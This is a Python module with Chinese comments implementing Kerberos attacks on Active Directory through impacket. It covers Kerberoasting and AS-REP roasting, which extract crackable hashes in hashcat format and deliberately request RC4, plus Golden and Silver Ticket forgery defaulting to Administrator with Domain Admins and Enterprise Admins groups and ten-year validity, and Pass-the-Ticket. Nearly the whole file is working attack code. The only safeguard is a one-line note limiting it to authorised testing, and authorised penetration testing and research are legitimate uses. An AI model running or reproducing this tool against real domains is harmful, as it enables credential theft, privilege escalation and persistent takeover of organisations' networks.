# -*- coding: utf-8 -*-
"""
Kerberos高级攻击模块 (Advanced Kerberos Attacks)
ATT&CK Techniques:
- T1558.003 - Kerberoasting
- T1558.004 - AS-REP Roasting
- T1558.001 - Golden Ticket
- T1558.002 - Silver Ticket
- T1550.003 - Pass the Ticket

基于impacket实现的完整Kerberos攻击工具:
- Kerberoasting: 请求SPN服务票据并提取可破解Hash
- AS-REP Roasting: 获取不需要预认证账户的Hash
- Golden Ticket: 使用krbtgt hash伪造TGT
- Silver Ticket: 使用服务账户hash伪造TGS
- Pass-the-Ticket: 注入票据进行认证

注意: 仅用于授权的渗透测试和安全研究
"""

import logging
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

# impacket imports
try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
    from impacket.krb5.types import KerberosTime, Principal

    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    logger.warning("impacket not available, some features will be limited")


@dataclass
class TicketInfo:
    """票据信息"""

    username: str
    domain: str
    spn: str
    enc_type: int
    cipher: bytes
    ticket_data: bytes = b""

    def to_hashcat(self) -> str:
        """转换为Hashcat格式"""
        if self.enc_type == 23:  # RC4-HMAC
            checksum = self.cipher[:16].hex()
            cipher_data = self.cipher[16:].hex()
            return (
                f"$krb5tgs$23$*{self.username}${self.domain}${self.spn}*${checksum}${cipher_data}"
            )
        elif self.enc_type == 18:  # AES256
            checksum = self.cipher[-12:].hex()
            cipher_data = self.cipher[:-12].hex()
            return (
                f"$krb5tgs$18${self.username}${self.domain}$*{self.spn}*${checksum}${cipher_data}"
            )
        elif self.enc_type == 17:  # AES128
            checksum = self.cipher[-12:].hex()
            cipher_data = self.cipher[:-12].hex()
            return (
                f"$krb5tgs$17${self.username}${self.domain}$*{self.spn}*${checksum}${cipher_data}"
            )
        return f"$krb5tgs${self.enc_type}${self.cipher.hex()}"


@dataclass
class ASREPInfo:
    """AS-REP Hash信息"""

    username: str
    domain: str
    enc_type: int
    cipher: bytes

    def to_hashcat(self) -> str:
        """转换为Hashcat格式"""
        if self.enc_type == 23:  # RC4-HMAC
            checksum = self.cipher[:16].hex()
            cipher_data = self.cipher[16:].hex()
            return f"$krb5asrep$23${self.username}@{self.domain}:{checksum}${cipher_data}"
        return f"$krb5asrep${self.enc_type}${self.cipher.hex()}"


@dataclass
class AttackResult:
    """攻击结果"""

    success: bool
    attack_type: str
    target: str
    hashes: List[str] = field(default_factory=list)
    tickets: List[TicketInfo] = field(default_factory=list)
    ccache_file: str = ""
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "success": self.success,
            "attack_type": self.attack_type,
            "target": self.target,
            "hash_count": len(self.hashes),
            "hashes": self.hashes,
            "ccache_file": self.ccache_file,
            "error": self.error,
        }


class KerberosAttacks:
    """
    Kerberos高级攻击类

    使用impacket实现完整的Kerberos攻击功能
    """

    def __init__(
        self,
        domain: str,
        dc_ip: str,
        username: str = "",
        password: str = "",
        ntlm_hash: str = "",
        aes_key: str = "",
        ccache_file: str = "",
    ):
        """
        初始化Kerberos攻击器

        Args:
            domain: 域名
            dc_ip: 域控IP
            username: 用户名
            password: 密码
            ntlm_hash: NTLM Hash (LM:NT 或 NT)
            aes_key: AES密钥
            ccache_file: ccache票据文件路径
        """
        if not IMPACKET_AVAILABLE:
            raise ImportError("impacket is required for KerberosAttacks")

        self.domain = domain.upper()
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.aes_key = aes_key
        self.ccache_file = ccache_file
        self.tgt = None
        self.tgt_key = None

    def _get_tgt(self) -> bool:
        """获取TGT"""
        if self.tgt:
            return True

        try:
            # 解析NTLM hash
            lm_hash = b""
            nt_hash = b""
            if self.ntlm_hash:
                if ":" in self.ntlm_hash:
                    lm_hash = bytes.fromhex(self.ntlm_hash.split(":")[0])
                    nt_hash = bytes.fromhex(self.ntlm_hash.split(":")[1])
                else:
                    nt_hash = bytes.fromhex(self.ntlm_hash)

            # 解析AES key
            aes_key = b""
            if self.aes_key:
                aes_key = bytes.fromhex(self.aes_key)

            self.tgt, self.tgt_key, _ = getKerberosTGT(
                clientName=Principal(
                    self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
                ),
                domain=self.domain,
                password=self.password,
                lmhash=lm_hash,
                nthash=nt_hash,
                aesKey=aes_key,
                kdcHost=self.dc_ip,
            )
            return True
        except Exception as e:
            logger.error("Failed to get TGT: %s", e)
            return False

    def kerberoast(
        self,
        spns: Optional[List[str]] = None,
        target_users: Optional[List[str]] = None,
        output_file: str = "",
    ) -> AttackResult:
        """
        Kerberoasting攻击

        请求SPN的TGS票据并提取可破解的Hash

        Args:
            spns: SPN列表 (如 ["MSSQLSvc/db.domain.com:1433"])
            target_users: 目标用户列表 (将查询其SPN)
            output_file: 输出文件路径

        Returns:
            AttackResult包含可破解的hash
        """
        if not self._get_tgt():
            return AttackResult(
                success=False,
                attack_type="Kerberoasting",
                target=self.dc_ip,
                error="Failed to obtain TGT",
            )

        hashes = []
        tickets = []

        spn_list = spns or []

        for spn in spn_list:
            try:
                logger.info("Requesting TGS for SPN: %s", spn)

                server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)

                tgs, cipher, _, session_key = getKerberosTGS(
                    serverName=server_name,
                    domain=self.domain,
                    kdcHost=self.dc_ip,
                    tgt=self.tgt,
                    cipher=self.tgt_key,
                    sessionKey=self.tgt_key,
                )

                # 提取加密部分
                tgs_rep = TGS_REP(tgs)
                enc_part = tgs_rep["ticket"]["enc-part"]["cipher"]
                enc_type = tgs_rep["ticket"]["enc-part"]["etype"]

                ticket_info = TicketInfo(
                    username=self.username,
                    domain=self.domain,
                    spn=spn,
                    enc_type=enc_type,
                    cipher=bytes(enc_part),
                    ticket_data=tgs,
                )

                hash_str = ticket_info.to_hashcat()
                hashes.append(hash_str)
                tickets.append(ticket_info)

                logger.info("[+] Got TGS for %s (etype %d)", spn, enc_type)

            except Exception as e:
                logger.warning("Failed to get TGS for %s: %s", spn, e)

        # 写入输出文件
        if output_file and hashes:
            try:
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(hashes))
                logger.info("Hashes written to %s", output_file)
            except IOError as e:
                logger.warning("Failed to write output file: %s", e)

        return AttackResult(
            success=len(hashes) > 0,
            attack_type="Kerberoasting",
            target=self.dc_ip,
            hashes=hashes,
            tickets=tickets,
        )

    def asrep_roast(
        self,
        usernames: List[str],
        output_file: str = "",
    ) -> AttackResult:
        """
        AS-REP Roasting攻击

        枚举不需要预认证的用户并获取可破解的Hash

        Args:
            usernames: 要测试的用户名列表
            output_file: 输出文件路径

        Returns:
            AttackResult包含可破解的hash
        """
        from impacket.krb5.asn1 import AS_REP, AS_REQ, seq_set, seq_set_iter
        from impacket.krb5.kerberosv5 import sendReceive
        from pyasn1.codec.der import decoder, encoder

        hashes = []

        for username in usernames:
            try:
                logger.info("Testing %s for AS-REP roasting...", username)

                client_name = Principal(
                    username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
                )

                # 构建AS-REQ (无预认证)
                as_req = AS_REQ()

                domain = self.domain.upper()
                server_name = Principal(
                    f"krbtgt/{domain}", type=constants.PrincipalNameType.NT_SRV_INST.value
                )

                pac_request = constants.PA_PAC_REQUEST()
                pac_request["include-pac"] = True
                encoder.encode(pac_request)

                as_req["pvno"] = 5
                as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

                req_body = seq_set(as_req, "req-body")

                opts = list()
                opts.append(constants.KDCOptions.forwardable.value)
                opts.append(constants.KDCOptions.renewable.value)
                opts.append(constants.KDCOptions.proxiable.value)
                req_body["kdc-options"] = constants.encodeFlags(opts)

                seq_set(req_body, "sname", server_name.components_to_asn1)
                seq_set(req_body, "cname", client_name.components_to_asn1)

                req_body["realm"] = domain

                now = datetime.utcnow() + timedelta(days=1)
                req_body["till"] = KerberosTime.to_asn1(now)
                req_body["rtime"] = KerberosTime.to_asn1(now)
                req_body["nonce"] = 0

                # 请求RC4加密 (更容易破解)
                seq_set_iter(
                    req_body,
                    "etype",
                    (
                        int(constants.EncryptionTypes.rc4_hmac.value),
                        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                    ),
                )

                message = encoder.encode(as_req)

                try:
                    response = sendReceive(message, domain, self.dc_ip)
                except Exception as e:
                    error_str = str(e)
                    if "KDC_ERR_PREAUTH_REQUIRED" in error_str:
                        logger.info("[-] %s requires pre-authentication", username)
                        continue
                    elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in error_str:
                        logger.info("[-] %s does not exist", username)
                        continue
                    else:
                        logger.warning("[-] %s: %s", username, e)
                        continue

                # 解析AS-REP
                as_rep = decoder.decode(response, asn1Spec=AS_REP())[0]

                enc_part = as_rep["enc-part"]["cipher"]
                enc_type = int(as_rep["enc-part"]["etype"])

                asrep_info = ASREPInfo(
                    username=username,
                    domain=self.domain,
                    enc_type=enc_type,
                    cipher=bytes(enc_part),
                )

                hash_str = asrep_info.to_hashcat()
                hashes.append(hash_str)

                logger.info("[+] %s is AS-REP roastable!", username)

            except Exception as e:
                logger.warning("Error testing %s: %s", username, e)

        # 写入输出文件
        if output_file and hashes:
            try:
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(hashes))
                logger.info("Hashes written to %s", output_file)
            except IOError as e:
                logger.warning("Failed to write output file: %s", e)

        return AttackResult(
            success=len(hashes) > 0,
            attack_type="AS-REP Roasting",
            target=self.dc_ip,
            hashes=hashes,
        )

    def golden_ticket(
        self,
        krbtgt_hash: str,
        domain_sid: str,
        target_user: str = "Administrator",
        user_id: int = 500,
        groups: Optional[List[int]] = None,
        duration: int = 10 * 365,
        output_file: str = "golden.ccache",
    ) -> AttackResult:
        """
        Golden Ticket攻击

        使用krbtgt hash伪造任意用户的TGT

        Args:
            krbtgt_hash: krbtgt账户的NTLM hash
            domain_sid: 域SID (如 S-1-5-21-xxx-xxx-xxx)
            target_user: 要伪造的用户名
            user_id: 用户RID (500=Administrator)
            groups: 组RID列表 (默认包含Domain Admins等)
            duration: 票据有效期 (天)
            output_file: 输出ccache文件路径

        Returns:
            AttackResult包含生成的票据
        """
        from impacket.krb5.ticket import Ticket as TicketClass

        if groups is None:
            # 默认高权限组
            groups = [
                513,  # Domain Users
                512,  # Domain Admins
                520,  # Group Policy Creator Owners
                518,  # Schema Admins
                519,  # Enterprise Admins
            ]

        try:
            logger.info("Generating Golden Ticket for %s...", target_user)

            # 解析krbtgt hash
            if ":" in krbtgt_hash:
                nt_hash = bytes.fromhex(krbtgt_hash.split(":")[1])
            else:
                nt_hash = bytes.fromhex(krbtgt_hash)

            # 创建票据
            ticket = TicketClass()
            ticket.create(
                username=target_user,
                domain=self.domain,
                sid=domain_sid,
                groups=groups,
                userId=user_id,
                key=nt_hash,
                duration=duration,
            )

            # 保存为ccache
            ccache = CCache()
            ccache.fromTGT(ticket.ticket, ticket.sessionKey, ticket.sessionKey)
            ccache.saveFile(output_file)

            logger.info("[+] Golden Ticket saved to %s", output_file)

            return AttackResult(
                success=True,
                attack_type="Golden Ticket",
                target=self.domain,
                ccache_file=output_file,
            )

        except Exception as e:
            logger.error("Failed to create Golden Ticket: %s", e)
            return AttackResult(
                success=False,
                attack_type="Golden Ticket",
                target=self.domain,
                error=str(e),
            )

    def silver_ticket(
        self,
        service_hash: str,
        domain_sid: str,
        spn: str,
        target_user: str = "Administrator",
        user_id: int = 500,
        groups: Optional[List[int]] = None,
        duration: int = 10 * 365,
        output_file: str = "silver.ccache",
    ) -> AttackResult:
        """
        Silver Ticket攻击

        使用服务账户hash伪造TGS

        Args:
            service_hash: 服务账户的NTLM hash
            domain_sid: 域SID
            spn: 目标服务SPN (如 cifs/server.domain.com)
            target_user: 要伪造的用户名
            user_id: 用户RID
            groups: 组RID列表
            duration: 票据有效期 (天)
            output_file: 输出ccache文件路径

        Returns:
            AttackResult包含生成的票据
        """
        from impacket.krb5.ticket import Ticket as TicketClass

        if groups is None:
            groups = [513, 512, 520, 518, 519]

        try:
            logger.info("Generating Silver Ticket for %s -> %s...", target_user, spn)

            # 解析service hash
            if ":" in service_hash:
                nt_hash = bytes.fromhex(service_hash.split(":")[1])
            else:
                nt_hash = bytes.fromhex(service_hash)

            # 创建服务票据
            ticket = TicketClass()
            ticket.create(
                username=target_user,
                domain=self.domain,
                sid=domain_sid,
                groups=groups,
                userId=user_id,
                key=nt_hash,
                spn=spn,
                duration=duration,
            )

            # 保存为ccache
            ccache = CCache()
            ccache.fromTGS(ticket.ticket, ticket.sessionKey, ticket.sessionKey)
            ccache.saveFile(output_file)

            logger.info("[+] Silver Ticket saved to %s", output_file)

            return AttackResult(
                success=True,
                attack_type="Silver Ticket",
                target=spn,
                ccache_file=output_file,
            )

        except Exception as e:
            logger.error("Failed to create Silver Ticket: %s", e)
            return AttackResult(
                success=False,
                attack_type="Silver Ticket",
                target=spn,
                error=str(e),
            )

    def pass_the_ticket(
        self,
        ccache_file: str,
    ) -> AttackResult:
        """
        Pass-the-Ticket

        加载ccache文件中的票据用于认证

        Args:
            ccache_file: ccache票据文件路径

        Returns:
            AttackResult包含加载结果
        """
        import os

        try:
            logger.info("Loading ticket from %s...", ccache_file)

            if not os.path.exists(ccache_file):
                return AttackResult(
                    success=False,
                    attack_type="Pass-the-Ticket",
                    target=ccache_file,
                    error="ccache file not found",
                )

            # 加载ccache
            ccache = CCache.loadFile(ccache_file)

            # 提取票据信息
            principal = ccache.principal
            credentials = ccache.credentials

            logger.info("[+] Loaded ticket for principal: %s", principal)
            logger.info("[+] Number of credentials: %d", len(credentials))

            for cred in credentials:
                server = cred["server"]
                logger.info("  - Service: %s", server)

            # 设置环境变量供其他工具使用
            os.environ["KRB5CCNAME"] = ccache_file

            self.ccache_file = ccache_file
            self.tgt = ccache.toTGT() if credentials else None

            return AttackResult(
                success=True,
                attack_type="Pass-the-Ticket",
                target=ccache_file,
                ccache_file=ccache_file,
            )

        except Exception as e:
            logger.error("Failed to load ticket: %s", e)
            return AttackResult(
                success=False,
                attack_type="Pass-the-Ticket",
                target=ccache_file,
                error=str(e),
            )

    def export_tickets(
        self,
        output_file: str = "tickets.ccache",
    ) -> AttackResult:
        """
        导出当前会话的票据到ccache文件

        Args:
            output_file: 输出文件路径

        Returns:
            AttackResult
        """
        try:
            if not self.tgt:
                return AttackResult(
                    success=False,
                    attack_type="Export Tickets",
                    target=output_file,
                    error="No TGT available",
                )

            ccache = CCache()
            ccache.fromTGT(self.tgt, self.tgt_key, self.tgt_key)
            ccache.saveFile(output_file)

            logger.info("[+] Tickets exported to %s", output_file)

            return AttackResult(
                success=True,
                attack_type="Export Tickets",
                target=output_file,
                ccache_file=output_file,
            )

        except Exception as e:
            logger.error("Failed to export tickets: %s", e)
            return AttackResult(
                success=False,
                attack_type="Export Tickets",
                target=output_file,
                error=str(e),
            )


# 便捷函数
def kerberos_attacks(
    domain: str,
    dc_ip: str,
    attack_type: str,
    username: str = "",
    password: str = "",
    ntlm_hash: str = "",
    targets: Optional[List[str]] = None,
    krbtgt_hash: str = "",
    service_hash: str = "",
    domain_sid: str = "",
    spn: str = "",
    output_file: str = "",
) -> Dict[str, Any]:
    """
    Kerberos攻击便捷函数

    Args:
        domain: 域名
        dc_ip: 域控IP
        attack_type: 攻击类型 (kerberoast/asrep/golden/silver/ptt)
        username: 用户名
        password: 密码
        ntlm_hash: NTLM hash
        targets: 目标列表 (用户名或SPN)
        krbtgt_hash: krbtgt hash (golden ticket)
        service_hash: 服务账户hash (silver ticket)
        domain_sid: 域SID
        spn: 服务SPN
        output_file: 输出文件

    Returns:
        攻击结果字典
    """
    if not IMPACKET_AVAILABLE:
        return {"success": False, "error": "impacket not available"}

    attacker = KerberosAttacks(
        domain=domain,
        dc_ip=dc_ip,
        username=username,
        password=password,
        ntlm_hash=ntlm_hash,
    )

    targets = targets or []

    if attack_type == "kerberoast":
        result = attacker.kerberoast(spns=targets, output_file=output_file)
    elif attack_type == "asrep":
        result = attacker.asrep_roast(usernames=targets, output_file=output_file)
    elif attack_type == "golden":
        result = attacker.golden_ticket(
            krbtgt_hash=krbtgt_hash,
            domain_sid=domain_sid,
            output_file=output_file or "golden.ccache",
        )
    elif attack_type == "silver":
        result = attacker.silver_ticket(
            service_hash=service_hash,
            domain_sid=domain_sid,
            spn=spn,
            output_file=output_file or "silver.ccache",
        )
    elif attack_type == "ptt":
        result = attacker.pass_the_ticket(ccache_file=output_file)
    else:
        return {"success": False, "error": f"Unknown attack type: {attack_type}"}

    return result.to_dict()


if __name__ == "__main__":
    import sys

    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

    if len(sys.argv) < 4:
        logger.info("Usage: python kerberos_attacks.py <domain> <dc_ip> <attack_type> [options]")
        logger.info("Attack types: kerberoast, asrep, golden, silver, ptt")
        logger.info("")
        logger.info("Examples:")
        logger.info(
            "  Kerberoast: python kerberos_attacks.py domain.com 10.0.0.1 kerberoast"
            " -u user -p pass -spn MSSQLSvc/db:1433"
        )
        logger.info(
            "  AS-REP:     python kerberos_attacks.py domain.com 10.0.0.1 asrep"
            " -users user1,user2,user3"
        )
        logger.info(
            "  Golden:     python kerberos_attacks.py domain.com 10.0.0.1 golden"
            " -krbtgt <hash> -sid S-1-5-21-xxx"
        )
        logger.info(
            "  Silver:     python kerberos_attacks.py domain.com 10.0.0.1 silver"
            " -hash <hash> -sid S-1-5-21-xxx -spn cifs/server"
        )
        logger.info(
            "  PTT:        python kerberos_attacks.py domain.com 10.0.0.1 ptt -ccache ticket.ccache"
        )
        sys.exit(1)

    logger.info("=== Kerberos Attacks Module ===")
    logger.info("Use the KerberosAttacks class or kerberos_attacks() function")
